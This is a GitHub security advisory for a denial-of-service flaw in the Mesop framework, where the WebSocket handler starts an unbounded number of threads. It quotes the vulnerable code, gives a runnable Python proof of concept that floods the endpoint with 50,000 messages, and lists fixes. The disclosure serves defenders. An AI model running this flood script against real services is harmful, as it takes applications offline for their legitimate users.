# [H] Mesop: Unbounded Thread Creation in WebSocket Handler Leads to Denial of Service

## Summary
Severity: High
Advisory: GHSA-3jr7-6hqp-x679
CVE: CVE-2026-34824
CWE: CWE-125, CWE-400, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-3jr7-6hqp-x679
Type: github-advisory

## Affected
- PyPI: `mesop` — affected >=1.2.3 <1.2.5

## Details
### Summary
An uncontrolled resource consumption vulnerability exists in the WebSocket implementation of the Mesop framework. An unauthenticated attacker can send a rapid succession of WebSocket messages, forcing the server to spawn an unbounded number of operating system threads. This leads to thread exhaustion and Out of Memory (OOM) errors, causing a complete Denial of Service (DoS) for any application built on the framework.

### Details
The vulnerability stems from an architectural flaw in how incoming WebSocket messages are processed. In the `mesop/server/server.py` file, the `handle_websocket` function listens for incoming messages and immediately spawns a new `threading.Thread` for every successfully parsed `ui_request`.

There is no thread pool, message queue, or rate-limiting mechanism implemented to restrict the number of concurrent threads spawned per connection. 

*Vulnerable code snippet in `mesop/server/server.py`:*
```python
while True:
    message = ws.receive()
    if not message:
        continue
    # ... message parsing logic ...

    # VULNERABILITY: Spawning a new thread for every single message without limits
    thread = threading.Thread(
        target=copy_current_request_context(ws_generate_data),
        args=(ws, ui_request),
        daemon=True,
    )
    thread.start()
```
### PoC
To reproduce this vulnerability, you only need a running instance of a Mesop application and a basic Python script to flood the WebSocket endpoint.

Prerequisites:

Python environment with the `websocket-client library` installed (`pip install websocket-client`).

A target Mesop application running locally (e.g., `http://localhost:8080`).

Steps to reproduce:

Start the target Mesop application.

Save the following script as `exploit_dos.py`.

Run the script: python `exploit_dos.py`. Watch the server's resource monitor; memory and thread counts will spike rapidly until the process crashes.

```
import websocket
import base64

# Replace with the target Mesop application's WebSocket URL
TARGET_WS_URL = "ws://localhost:8080/__ui__"

# A minimal valid base64 payload to bypass `base64.urlsafe_b64decode` 
# and Protobuf `ParseFromString` without throwing a parsing exception.
EMPTY_UI_REQUEST_B64 = base64.urlsafe_b64encode(b'').decode('utf-8')

def flood_server():
    ws = websocket.WebSocket()
    try:
        ws.connect(TARGET_WS_URL)
        print("[+] Connection established. Initiating thread exhaustion attack...")
        
        # Rapidly send 50,000 messages to force the server to spawn 50,000 threads
        for i in range(50000):
            ws.send(EMPTY_UI_REQUEST_B64)
            
        print("[+] Payloads sent. The server should be unresponsive or crashed by now.")
        ws.close()
    except Exception as e:
        print(f"[-] Connection closed or server crashed: {e}")

if __name__ == "__main__":
    flood_server()
```
### Impact
Vulnerability Type: Denial of Service (DoS) / CWE-400: Uncontrolled Resource Consumption.

Impacted Parties: Any developer or organization deploying a Mesop-based application to a publicly accessible network.

Severity: High. An unauthenticated external attacker can completely crash the application within seconds using minimal bandwidth from a single machine, rendering the service unavailable to all legitimate users.

### Mitigation (Recommended Fixes):

Use a bounded thread pool (e.g., ThreadPoolExecutor with max_workers)
Introduce per-connection rate limiting
Implement a message queue with backpressure
Consider migrating to an async event loop model instead of spawning OS threads

## References
- https://github.com/mesop-dev/mesop/security/advisories/GHSA-3jr7-6hqp-x679
- https://nvd.nist.gov/vuln/detail/CVE-2026-34824
- https://github.com/mesop-dev/mesop/commit/760a2079b5c609038c826d24dfbcf9b0be98d987
- https://github.com/mesop-dev/mesop
- https://github.com/mesop-dev/mesop/releases/tag/v1.2.5
